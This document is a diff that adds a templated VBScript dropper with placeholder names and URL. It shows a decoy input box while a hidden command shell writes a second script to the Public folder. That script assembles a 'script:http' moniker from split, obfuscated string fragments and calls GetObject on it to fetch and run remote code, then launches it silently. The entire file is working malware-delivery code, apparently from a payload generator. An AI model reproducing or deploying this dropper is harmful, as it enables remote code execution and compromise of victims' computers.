@@ -1,0 +1,22 @@
+
+function {{FUNC_NAME}}()
+    InputBox "{{CONST8}}", "{{CONST8}}", "{{CONST9}}"
+end function
+
+
+
+
+CreateObject("Wscript.Shell").Run "cmd /c (" & _
+"echo {{VAR1}}=""tp"" & " & _
+"echo {{VAR2}}=""ri"" & " & _
+"echo. & " & _
+"echo {{VAR3}}=""."" & " & _
+"echo {{VAR4}}=""sC"" ^& {{VAR2}} ^& ""pt:ht"" ^& {{VAR1}} ^& ""://"" & " & _
+"echo {{VAR4}}={{VAR4}} ^& ""{{URL}}"" & " & _
+"echo. & " & _
+"echo GetObject^({{VAR4}}^)" & _
+") > %Public%\{{VBS_NAME}}", 2, TRUE
+{{FUNC_NAME}}
+CreateObject("Wscript.Shell").Run "cmd /V/D/c start %Public%\{{VBS_NAME}}", 2, TRUE
+
+close
